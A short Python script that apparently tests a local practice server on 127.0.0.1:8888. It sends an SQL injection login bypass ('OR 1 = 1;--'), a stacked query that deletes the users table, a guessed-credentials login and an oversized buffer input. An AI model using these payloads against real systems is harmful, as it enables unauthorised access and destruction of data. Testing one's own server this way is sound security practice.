import sys
import socket
import json

conn_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_addr = ('127.0.0.1', 8888)


def tcp_init():
    try:
        conn_tcp.connect(server_addr)
    except socket.error:
        print('Server not responding')


def tcp_data(data: str) -> str:
    try:
        conn_tcp.send(data)
        return conn_tcp.recv(10000).decode()

    except socket.error:
        return 'bad request'


if __name__ == "__main__":
    tcp_init()

    # SQL-Attack
    data = json.dumps(["users", "vladik", "'random' OR 1 = 1;--"]).encode()
    data = json.loads(tcp_data(data))
    print('Get', data)
    data = json.dumps(['up', "'test'; DELETE FROM users;", '']).encode()
    data = json.loads(tcp_data(data))
    print('Get', data, '\n')

    # Privilege-Attack
    data = json.dumps(['users', 'vlad', 'password']).encode()
    data = json.loads(tcp_data(data))
    print('Get', data, '\n')

    # Buffer-Attack
    try:
        data = json.dumps(['a' * (4096 - 37)]).encode()
        print('Size: ', sys.getsizeof(data), ' bytes')
        data = json.loads(tcp_data(data))
        print('Get', data, '\n')
    except:
        print('Connection closed!')
